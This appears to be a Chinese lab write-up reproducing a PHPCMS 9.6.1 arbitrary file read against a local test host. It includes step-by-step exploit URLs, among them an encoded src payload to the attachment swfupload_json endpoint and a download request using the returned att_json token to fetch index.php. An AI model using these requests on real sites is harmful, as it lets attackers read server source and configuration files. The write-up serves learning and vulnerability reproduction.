ailx10说：这篇是2024年8月之前写的，后来又改过。PHPCMS 文件读取这次不是一个请求结束，我按 Cookie、附件接口、下载页面和最终文件的顺序走了四步。前面得到的值得带进后一步，直到最后下载到 index.php，整段才算连上。写笔记时我把这些中间对象都留了下来，免得以后只记得有个下载链接。它让我感到，状态在请求之间怎样传递本身就是理解漏洞的一部分；头里的 Cookie 和响应体不是同一个地方，取错一个值，后面的请求看着再像也可能只是走了个空流程。

---

PHPCMS9.6.1四请求文件读取：取siteid Cookie转userid\_flash，附件接口按编码src生成att\_json，再下载接口获取链接并下载index.php。

核查提示：正文一处说响应体提att\_json但实际Set-Cookie是头；案例仅index.php，不以任意名义推全系统范围，POST体需从下一篇补齐理解。 原实验和代码未重新运行，图内细节有待核验。

今天在本地复现一下PHPCMS 9.6.1 任意文件读取漏洞，总共4次请求，第一次GET请求获取 siteid ，第二次POST请求获取 att\_json ，第三次GET请求获取下载链接，第四次GET请求文件下载，实现任意文件读取。核心是第二次POST请求，需在其中指定待下载的文件路径。

（1）访问URL，从响应头中提取 siteid

```
http://192.168.0.107/index.php?m=wap&c=index&a=init&siteid=1
```

![](/notes-assets/b2425a06c867120a7c2e.webp)

点击Network可以在Response Headers的set-cookie中找到 iZDZM\_siteid

```
set-cookie:
iZDZM_siteid=91dff_o8k5P4l1TGNFq88jj3_OTB_Y3CuOfkXnPI
```

![](/notes-assets/59c040eddc5e26a4e1b5.webp)

（2）构造URL，比如想要读取 index.php

使用上面的 siteid 作为 userid\_flash ，POST提交

```
http://192.168.0.107/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp
```

其中载荷解码后是

```
pad=x&i=1&modelid=1&catid=1&d=1&m=1&s=index&f=.p%253chp
```

![](/notes-assets/2a523a0a7006ee786f23.webp)

从响应头的 Set-Cookie 中提取 att\_json，并结合实际响应核对。

```
set-cookie:
iZDZM_att_json=c64a1poCf52Yj9FpWZouu9cSPE-60D0imUkrJAsQ_H8oPArUVUCRDXzAnTSOC890_yd6Rt96RkEAwlRe5ZtY8s8XXaSYwGZESSkLx8bdwXyxU_WibbLa4ZInxBcr8j5_NmCveJJl2P2eWKJvLIvRn2JxOm0
```

![](/notes-assets/2c55311a3841d87202de.webp)

（3）构造URL

使用上面的 att\_json 作为 a\_k 的值，GET 提交，出现下载按钮

```
http://192.168.0.107/index.php?m=content&c=down&a=init&a_k=c64a1poCf52Yj9FpWZouu9cSPE-60D0imUkrJAsQ_H8oPArUVUCRDXzAnTSOC890_yd6Rt96RkEAwlRe5ZtY8s8XXaSYwGZESSkLx8bdwXyxU_WibbLa4ZInxBcr8j5_NmCveJJl2P2eWKJvLIvRn2JxOm0
```

![](/notes-assets/6376025687beb82b4133.webp)

（4）点击下载，得到 p\_hp文件，内容是 index.php

下载链接，可以从上面的响应内容中提取出来

![](/notes-assets/81a445553b340dc8e52e.webp)

拿到一个下载页面还不是终点，真正返回的文件内容才是最后一环。按这个顺序回看，既能找到字段在哪儿变了，也能避免把某个中间页面误当成读取完成。
